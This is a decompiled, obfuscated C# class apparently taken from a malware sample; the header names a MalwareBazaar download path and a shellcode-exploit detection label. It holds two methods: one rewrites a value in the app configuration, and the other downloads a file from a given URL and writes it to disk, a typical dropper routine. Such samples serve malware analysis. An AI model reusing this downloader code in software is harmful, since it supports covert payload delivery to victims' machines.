// Decompiled with JetBrains decompiler
// Type: 093761465127.043183538068
// Assembly: 569990687827, Version=14.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 58118FF0-4F0E-4F7B-A626-B24D4B565FEB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-23ff706959b1522b1ea60243d4aeb9928372332bce1e128933386bf4f714f8ad.exe

using \u003716342880183;
using System;
using System.Configuration;
using System.IO;
using System.Net;

namespace \u003093761465127
{
  public static class \u003043183538068
  {
    public static void \u003601478359164(string _param0, string _param1)
    {
      if (string.IsNullOrWhiteSpace(_param0))
        throw new ArgumentNullException("key");
      System.Configuration.Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
      configuration.AppSettings.Settings[_param0].Value = _param1;
      configuration.Save(ConfigurationSaveMode.Modified);
      ConfigurationManager.RefreshSection("appSettings");
    }

    public static void \u003738075642985(string _param0, string _param1)
    {
      if (string.IsNullOrWhiteSpace(_param0))
        return;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
      httpWebRequest.UserAgent = \u003665947762643.\u003803953525496;
      httpWebRequest.AllowAutoRedirect = true;
      httpWebRequest.KeepAlive = false;
      int totalMilliseconds = (int) TimeSpan.FromMinutes(10.0).TotalMilliseconds;
      httpWebRequest.Timeout = totalMilliseconds;
      httpWebRequest.ReadWriteTimeout = totalMilliseconds;
      using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
      {
        using (Stream responseStream = response.GetResponseStream())
        {
          if (responseStream == null)
            return;
          using (FileStream fileStream = new FileStream(_param1, FileMode.Create, FileAccess.Write, FileShare.None))
          {
            byte[] buffer = new byte[8192];
            int length = buffer.Length;
            int count;
            while ((count = responseStream.Read(buffer, 0, length)) > 0)
            {
              fileStream.Write(buffer, 0, count);
              fileStream.Flush();
            }
          }
        }
      }
    }
  }
}
